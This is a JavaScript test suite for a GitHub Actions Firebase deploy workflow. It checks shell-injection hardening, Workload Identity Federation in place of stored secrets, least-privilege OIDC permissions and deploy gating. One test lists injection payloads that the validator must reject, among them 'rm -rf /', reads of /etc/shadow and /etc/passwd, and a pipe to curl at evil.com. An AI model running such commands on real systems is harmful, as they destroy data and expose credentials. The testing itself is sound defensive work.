import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { validateHostingTarget } from '../verify-firebase-config.mjs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const rootDir = path.resolve(__dirname, '../..');
const workflowPath = path.join(rootDir, '.github', 'workflows', 'deploy-hosting.yml');

describe('GitHub Actions Workflow Security & Shell Injection Hardening', () => {
  assert.ok(fs.existsSync(workflowPath), 'deploy-hosting.yml must exist');
  const workflowContent = fs.readFileSync(workflowPath, 'utf8');

  it('1. Ensures zero direct ${{ inputs.* }} interpolation inside any run: script block', () => {
    const lines = workflowContent.split('\n');
    let insideRunBlock = false;
    let runIndent = -1;
    const violations = [];

    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];
      const trimmed = line.trim();

      // Check if entering a run block (single or multiline)
      if (trimmed.startsWith('run:')) {
        insideRunBlock = true;
        runIndent = line.search(/\S/);
        // Check single line run:
        if (line.includes('${{ inputs.')) {
          violations.push({ line: i + 1, content: line });
        }
        continue;
      }

      if (insideRunBlock) {
        const currentIndent = line.search(/\S/);
        // If non-empty line has indent less than or equal to run block indentation, run block ended
        if (trimmed.length > 0 && currentIndent <= runIndent) {
          insideRunBlock = false;
        } else {
          // Inside run block content
          if (line.includes('${{ inputs.')) {
            violations.push({ line: i + 1, content: line });
          }
        }
      }
    }

    assert.strictEqual(
      violations.length,
      0,
      `Detected direct \${{ inputs.* }} interpolation in run: script (CWE-78 exposure):\n` +
      violations.map(v => `  Line ${v.line}: ${v.content}`).join('\n')
    );
  });

  it('2. Enforces environment variables mapping for workflow dispatch inputs', () => {
    assert.ok(
      workflowContent.includes('INPUT_TARGET_SITE: ${{ inputs.target_site }}'),
      'Must pass inputs.target_site through env mapping INPUT_TARGET_SITE'
    );
    assert.ok(
      workflowContent.includes('INPUT_DRY_RUN: ${{ inputs.dry_run }}'),
      'Must pass inputs.dry_run through env mapping INPUT_DRY_RUN'
    );
    assert.ok(
      workflowContent.includes('TARGET_SITE="${INPUT_TARGET_SITE:-orderbhojan}"'),
      'Must safely read and default TARGET_SITE from quoted env var'
    );
    assert.ok(
      workflowContent.includes('DRY_RUN="${INPUT_DRY_RUN:-true}"'),
      'Must safely read and default DRY_RUN from quoted env var'
    );
    assert.ok(
      workflowContent.includes('"$GITHUB_STEP_SUMMARY"'),
      'Must quote GITHUB_STEP_SUMMARY in shell script'
    );
  });

  it('3. Restricts target_site to strict choice type with only "orderbhojan"', () => {
    // Check workflow_dispatch inputs structure
    assert.ok(
      workflowContent.includes("target_site:"),
      'Must define target_site input'
    );
    assert.ok(
      workflowContent.includes("type: choice"),
      'target_site must be restricted with type: choice'
    );
    assert.ok(
      workflowContent.includes("- 'orderbhojan'"),
      "target_site choice options must strictly contain only 'orderbhojan'"
    );
    assert.ok(
      workflowContent.includes("default: 'orderbhojan'"),
      "target_site must default to 'orderbhojan'"
    );
  });

  it('4. Rejects arbitrary strings and shell injection metacharacters via validateHostingTarget', () => {
    // Valid target
    const validRes = validateHostingTarget('orderbhojan');
    assert.strictEqual(validRes.valid, true);
    assert.strictEqual(validRes.target, 'orderbhojan');

    // Attack payloads - Shell command injection
    const maliciousPayloads = [
      'orderbhojan; rm -rf /',
      'orderbhojan && cat /etc/shadow',
      'orderbhojan | curl http://evil.com',
      '$(whoami)',
      '`id`',
      '> /tmp/exploit',
      'orderbhojan\nrm -rf /',
      'orderbhojan\r\nreboot',
      '"orderbhojan"',
      "'orderbhojan'",
      'orderbhojan; echo test',
      'orderbhojan$(cat /etc/passwd)',
      'orderbhojan`id`',
    ];

    for (const payload of maliciousPayloads) {
      const res = validateHostingTarget(payload);
      assert.strictEqual(
        res.valid,
        false,
        `Malicious payload must be rejected: ${payload}`
      );
    }

    // Invalid targets
    const unauthorizedTargets = [
      'bhojanos-prod',
      'admin',
      'staging',
      'orderbhojan-test',
      '',
      '   ',
      null,
      undefined,
      12345,
    ];

    for (const target of unauthorizedTargets) {
      const res = validateHostingTarget(target);
      assert.strictEqual(
        res.valid,
        false,
        `Unauthorized target must be rejected: ${target}`
      );
    }
  });

  it('5. Eliminates legacy JSON service account secrets and ensures no replacement secrets', () => {
    // Verify complete removal of legacy JSON secret
    assert.strictEqual(
      workflowContent.includes('FIREBASE_SERVICE_ACCOUNT_ORDERBHOJAN'),
      false,
      'Must NOT reference secrets.FIREBASE_SERVICE_ACCOUNT_ORDERBHOJAN anywhere'
    );
    assert.strictEqual(
      workflowContent.includes('secrets.FIREBASE_SERVICE_ACCOUNT'),
      false,
      'Must NOT reference any secrets.FIREBASE_SERVICE_ACCOUNT'
    );

    // Verify google-github-actions/auth@v2 configuration
    assert.ok(
      workflowContent.includes('uses: google-github-actions/auth@v2'),
      'Must use google-github-actions/auth@v2 for WIF authentication'
    );
    assert.ok(
      workflowContent.includes('workload_identity_provider: ${{ vars.GCP_WORKLOAD_IDENTITY_PROVIDER }}'),
      'Must reference vars.GCP_WORKLOAD_IDENTITY_PROVIDER'
    );
    assert.ok(
      workflowContent.includes('service_account: ${{ vars.GCP_SERVICE_ACCOUNT }}'),
      'Must reference vars.GCP_SERVICE_ACCOUNT'
    );
  });

  it('6. Enforces job-level OIDC isolation: verify-and-align has contents: read only, id-token: write isolated to deploy-hosting', () => {
    // Find job definitions
    const verifyJobMatch = workflowContent.match(/verify-and-align:[\s\S]*?(?=\n  [a-z0-9_-]+:|$)/);
    assert.ok(verifyJobMatch, 'Must define verify-and-align job');
    const verifyJob = verifyJobMatch[0];

    // Assert verify-and-align does NOT have id-token: write
    assert.strictEqual(
      verifyJob.includes('id-token: write'),
      false,
      'verify-and-align MUST NOT have id-token: write permission (least-privilege requirement)'
    );
    assert.ok(
      verifyJob.includes('permissions:\n      contents: read') || verifyJob.includes('contents: read'),
      'verify-and-align must be restricted to contents: read'
    );

    // Find deploy-hosting job definition
    const deployJobMatch = workflowContent.match(/deploy-hosting:[\s\S]*?(?=\n  [a-z0-9_-]+:|$)/);
    assert.ok(deployJobMatch, 'Must define isolated deploy-hosting job');
    const deployJob = deployJobMatch[0];

    // Assert deploy-hosting has id-token: write and needs verify-and-align
    assert.ok(
      deployJob.includes('needs: verify-and-align'),
      'deploy-hosting job must require verify-and-align to succeed first'
    );
    assert.ok(
      deployJob.includes('id-token: write'),
      'deploy-hosting job must have id-token: write permission for WIF token minting'
    );

    // Assert WIF authentication and deploy are in deploy-hosting job, NOT in verify-and-align
    assert.strictEqual(
      verifyJob.includes('uses: google-github-actions/auth@v2'),
      false,
      'WIF authentication must NOT be present in verify-and-align'
    );
    assert.ok(
      deployJob.includes('uses: google-github-actions/auth@v2'),
      'WIF authentication must be located in deploy-hosting'
    );
  });

  it('7. Enforces strict job-level gating: deploy-hosting only executes on workflow_dispatch with dry_run false and main branch', () => {
    const deployJobMatch = workflowContent.match(/deploy-hosting:[\s\S]*?(?=\n  [a-z0-9_-]+:|$)/);
    assert.ok(deployJobMatch, 'Must define deploy-hosting job');
    const deployJob = deployJobMatch[0];

    // Verify condition on deploy-hosting job
    const jobConditionRegex = /if:\s*github\.event_name\s*==\s*'workflow_dispatch'\s*&&\s*inputs\.dry_run\s*==\s*false\s*&&\s*github\.ref\s*==\s*'refs\/heads\/main'/;
    assert.ok(
      jobConditionRegex.test(deployJob),
      'deploy-hosting job must be guarded by: github.event_name == "workflow_dispatch" && inputs.dry_run == false && github.ref == "refs/heads/main"'
    );

    // Verify dry_run defaults to true
    assert.ok(
      workflowContent.includes('default: true'),
      'dry_run input must default to true'
    );

    // Verify deploy command targets hosting:orderbhojan and project orderbhojan
    assert.ok(
      deployJob.includes('hosting:orderbhojan'),
      'Deploy command must explicitly target "hosting:orderbhojan"'
    );
    assert.ok(
      deployJob.includes('--project orderbhojan'),
      'Deploy command must explicitly specify project "orderbhojan"'
    );
  });
});
